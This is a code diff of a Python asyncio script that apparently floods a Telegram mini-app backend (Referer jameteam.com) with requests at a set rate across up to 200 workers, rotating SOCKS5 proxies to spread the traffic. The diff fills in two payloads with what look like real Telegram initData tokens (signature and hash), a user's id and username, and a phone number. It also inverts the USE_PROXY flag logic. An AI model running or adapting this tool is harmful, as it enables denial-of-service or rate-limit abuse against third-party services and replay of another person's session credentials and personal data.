@@ -20,12 +20,42 @@ DURATION = int(os.getenv("DURATION_SECONDS", "0"))
 MAX_WORKERS = int(os.getenv("MAX_WORKERS", "200"))
 TIMEOUT = int(os.getenv("TIMEOUT", "5"))
 PROXY_FILE = os.getenv("PROXY_FILE", "proxy.txt")
-LOG_LEVEL = os.getenv("LOG_LEVEL", "full")       # full — каждый запрос
-USE_PROXY = os.getenv("USE_PROXY", "0") == "1"   # можно отключить прокси
+LOG_LEVEL = os.getenv("LOG_LEVEL", "full")
+USE_PROXY = os.getenv("USE_PROXY", "1") == "0"
 
-# ---------- PAYLOAD (как у вас) ----------
-PAYLOAD1 = { ... }   # (полный payload из вашего скрипта, не меняется)
-PAYLOAD2 = { ... }
+# ---------- PAYLOAD1 ----------
+PAYLOAD1 = {
+    "action": "app_opened",
+    "bot_id": "3308",
+    "initData": "query_id=AAG0PbMlAAAAALQ9syWANX0a&user=%7B%22id%22%3A632503732%2C%22first_name%22%3A%22%F0%9F%91%89%F0%9F%8F%BB%F0%9F%91%8C%F0%9F%8F%BB%F0%9F%A5%B5%22%2C%22last_name%22%3A%22%22%2C%22username%22%3A%22rekrut%22%2C%22language_code%22%3A%22ru%22%2C%22is_premium%22%3Atrue%2C%22allows_write_to_pm%22%3Atrue%2C%22photo_url%22%3A%22https%3A%5C%2F%5C%2Ft.me%5C%2Fi%5C%2Fuserpic%5C%2F320%5C%2F3Rh7rfuUzLDv9psEiz8liMd9OP75rDao7HhypSIsBzY.svg%22%7D&auth_date=1777292794&signature=z6Nv9RzGnkCvtZU_v8A9Y2jfYjK3dIiZWXPJKfNHjjdzqkwr86IK28aNbcRLdPBxezitsqLQCE0TrKY34ojQBQ&hash=f63c469fdf06dd45b230cdfae26f5eacdc360b97fa89cc9b93812b40b2dd4262",
+    "user": {
+        "id": 632503732,
+        "first_name": "👉🏻👌🏻🥵",
+        "last_name": "",
+        "username": "rekrut",
+        "language_code": "ru",
+        "is_premium": True,
+        "allows_write_to_pm": True,
+        "photo_url": "https://t.me/i/userpic/320/3Rh7rfuUzLDv9psEiz8liMd9OP75rDao7HhypSIsBzY.svg"
+    }
+}
+
+# ---------- PAYLOAD2 ----------
+PAYLOAD2 = {
+    "bot_id": "3308",
+    "initData": "query_id=AAG0PbMlAAAAALQ9syWANX0a&user=%7B%22id%22%3A632503732%2C%22first_name%22%3A%22%F0%9F%91%89%F0%9F%8F%BB%F0%9F%91%8C%F0%9F%8F%BB%F0%9F%A5%B5%22%2C%22last_name%22%3A%22%22%2C%22username%22%3A%22rekrut%22%2C%22language_code%22%3A%22ru%22%2C%22is_premium%22%3Atrue%2C%22allows_write_to_pm%22%3Atrue%2C%22photo_url%22%3A%22https%3A%5C%2F%5C%2Ft.me%5C%2Fi%5C%2Fuserpic%5C%2F320%5C%2F3Rh7rfuUzLDv9psEiz8liMd9OP75rDao7HhypSIsBzY.svg%22%7D&auth_date=1777292794&signature=z6Nv9RzGnkCvtZU_v8A9Y2jfYjK3dIiZWXPJKfNHjjdzqkwr86IK28aNbcRLdPBxezitsqLQCE0TrKY34ojQBQ&hash=f63c469fdf06dd45b230cdfae26f5eacdc360b97fa89cc9b93812b40b2dd4262",
+    "phone": "+79953200833",
+    "user": {
+        "id": 632503732,
+        "first_name": "👉🏻👌🏻🥵",
+        "last_name": "",
+        "username": "rekrut",
+        "language_code": "ru",
+        "is_premium": True,
+        "allows_write_to_pm": True,
+        "photo_url": "https://t.me/i/userpic/320/3Rh7rfuUzLDv9psEiz8liMd9OP75rDao7HhypSIsBzY.svg"
+    }
+}
 
 HEADERS = {
     "Accept": "application/json, text/plain, */*",
@@ -35,10 +65,16 @@ HEADERS = {
     "Referer": "https://jameteam.com/",
 }
 
+# ---------- Глобальные переменные ----------
 running = True
-stats = { "total": 0, "success": 0, "failed": 0,
-          "by_endpoint": defaultdict(lambda: {"total":0,"success":0,"failed":0,"times":[]}),
-          "statuses": defaultdict(int), "errors": defaultdict(int) }
+stats = {
+    "total": 0,
+    "success": 0,
+    "failed": 0,
+    "by_endpoint": defaultdict(lambda: {"total": 0, "success": 0, "failed": 0, "times": []}),
+    "statuses": defaultdict(int),
+    "errors": defaultdict(int),
+}
 proxies = []
 start_time = 0
 
@@ -55,9 +91,9 @@ def load_proxies():
                 if not line or line.startswith('#'):
                     continue
                 if '@' in line:
-                    auth, host = line.split('@',1)
+                    auth, host = line.split('@', 1)
                     if ':' in auth:
-                        login, pw = auth.split(':',1)
+                        login, pw = auth.split(':', 1)
                     else:
                         login, pw = auth, ''
                     proxies.append((f"socks5://{host}", login, pw))
@@ -65,13 +101,10 @@ def load_proxies():
                     proxies.append((f"socks5://{line}", None, None))
         print(f"✅ Загружено прокси: {len(proxies)}")
         if proxies:
-            # Проверим первый прокси коротким запросом
             print("🔍 Проверяем первый прокси...")
             asyncio.create_task(test_proxy(proxies[0]))
     except FileNotFoundError:
         print(f"⚠️ Файл {PROXY_FILE} не найден. Работаем без прокси.")
-        global USE_PROXY
-        USE_PROXY = False
 
 async def test_proxy(proxy_info):
     proxy_url, login, password = proxy_info
@@ -84,7 +117,8 @@ async def test_proxy(proxy_info):
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             async with session.get("https://httpbin.org/ip", timeout=5) as resp:
                 if resp.status == 200:
-                    print("✅ Прокси работает, ответ:", await resp.text())
+                    text = await resp.text()
+                    print("✅ Прокси работает, ответ:", text[:100])
                 else:
                     print("⚠️ Прокси вернул статус:", resp.status)
     except Exception as e:
@@ -124,12 +158,12 @@ async def send_request(session, req_id):
         stats["total"] += 1
         stats["failed"] += 1
         stats["errors"]["ProxyError"] += 1
-        print(f"[{datetime.now():%H:%M:%S}] ❌ #{req_id} ПРОКСИ ОШИБКА: {e}")
+        print(f"[{datetime.now():%H:%M:%S}] ❌ #{req_id} PROXY ERROR: {e}")
     except aiohttp.ClientConnectorError as e:
         stats["total"] += 1
         stats["failed"] += 1
         stats["errors"]["ConnectorError"] += 1
-        print(f"[{datetime.now():%H:%M:%S}] ❌ #{req_id} НЕТ СОЕДИНЕНИЯ: {e}")
+        print(f"[{datetime.now():%H:%M:%S}] ❌ #{req_id} CONNECTION ERROR: {e}")
     except Exception as e:
         stats["total"] += 1
         stats["failed"] += 1
@@ -137,14 +171,12 @@ async def send_request(session, req_id):
         if stats["total"] % 20 == 0:
             print(f"[{datetime.now():%H:%M:%S}] ❌ #{req_id} {type(e).__name__}: {str(e)[:100]}")
 
-async def worker(worker_id, rate):
-    interval = 1.0 / rate
+async def worker(worker_id, rate_per_sec):
+    interval = 1.0 / rate_per_sec
     next_time = time.perf_counter()
-    # Берем прокси для этого воркера (циклически)
     proxy_info = None
     if USE_PROXY and proxies:
         proxy_info = proxies[worker_id % len(proxies)]
-    # Создаём connector
     if proxy_info:
         proxy_url, login, password = proxy_info
         if login and password:
@@ -162,6 +194,8 @@ async def worker(worker_id, rate):
             sleep = next_time - time.perf_counter()
             if sleep > 0:
                 await asyncio.sleep(sleep)
+            else:
+                next_time = time.perf_counter()
 
 async def stats_reporter():
     last_total = 0
@@ -171,24 +205,22 @@ async def stats_reporter():
         now = time.perf_counter()
         elapsed = now - start_time
         cur_total = stats["total"]
-        if elapsed > 0:
+        if elapsed > 0 and cur_total > last_total:
             avg_rps = cur_total / elapsed
-            cur_rps = (cur_total - last_total) / (now - last_time) if (now - last_time) > 0 else 0
-            success_rate = (stats["success"] / cur_total * 100) if cur_total else 0
-            print(f"\n{'='*70}")
-            print(f"[{datetime.now():%H:%M:%S}] ⏱️ {elapsed:.0f}с | Запросов: {cur_total:,} | RPS тек: {cur_rps:.0f} ср:{avg_rps:.0f} | Цель: {RPS_TOTAL}")
+            cur_rps = (cur_total - last_total) / (now - last_time)
+            success_rate = stats["success"] / cur_total * 100 if cur_total else 0
+            print(f"\n{'='*80}")
+            print(f"[{datetime.now():%H:%M:%S}] ⏱️ {elapsed:.0f}с | Всего: {cur_total:,} | RPS: {cur_rps:.0f} (ср:{avg_rps:.0f}) | Цель: {RPS_TOTAL}")
             print(f"✅ Успех: {stats['success']:,} ({success_rate:.1f}%) | ❌ Ошибок: {stats['failed']:,}")
             for ep, data in stats["by_endpoint"].items():
-                ep_total = data["total"]
-                if ep_total:
-                    ep_rate = data["success"] / ep_total * 100 if ep_total else 0
+                if data["total"]:
+                    ep_rate = data["success"] / data["total"] * 100 if data["total"] else 0
                     times = data["times"]
                     p95 = sorted(times[-500:])[int(len(times[-500:])*0.95)] if times else 0
-                    print(f"   {ep}: {ep_total} зап, успех {ep_rate:.1f}%, p95={p95:.0f}мс")
-            # Покажем последние ошибки (первые 3 типа)
+                    print(f"   {ep}: {data['total']} зап, успех {ep_rate:.1f}%, p95={p95:.0f}мс")
             if stats["errors"]:
                 print("❌ Ошибки:", dict(list(stats["errors"].items())[:3]))
-            print(f"{'='*70}")
+            print(f"{'='*80}")
             last_total, last_time = cur_total, now
 
 async def main():
@@ -207,7 +239,7 @@ async def main():
 
     workers_cnt = min(MAX_WORKERS, max(10, RPS_TOTAL // 15))
     rate_per_worker = RPS_TOTAL / workers_cnt
-    print(f"🔧 Воркеров: {workers_cnt} | RPS/воркер: {rate_per_worker:.2f}\n")
+    print(f"🔧 Активировано воркеров: {workers_cnt} | RPS на воркера: {rate_per_worker:.2f}\n")
     tasks = [asyncio.create_task(worker(i, rate_per_worker)) for i in range(workers_cnt)]
     tasks.append(asyncio.create_task(stats_reporter()))
     start_time = time.perf_counter()
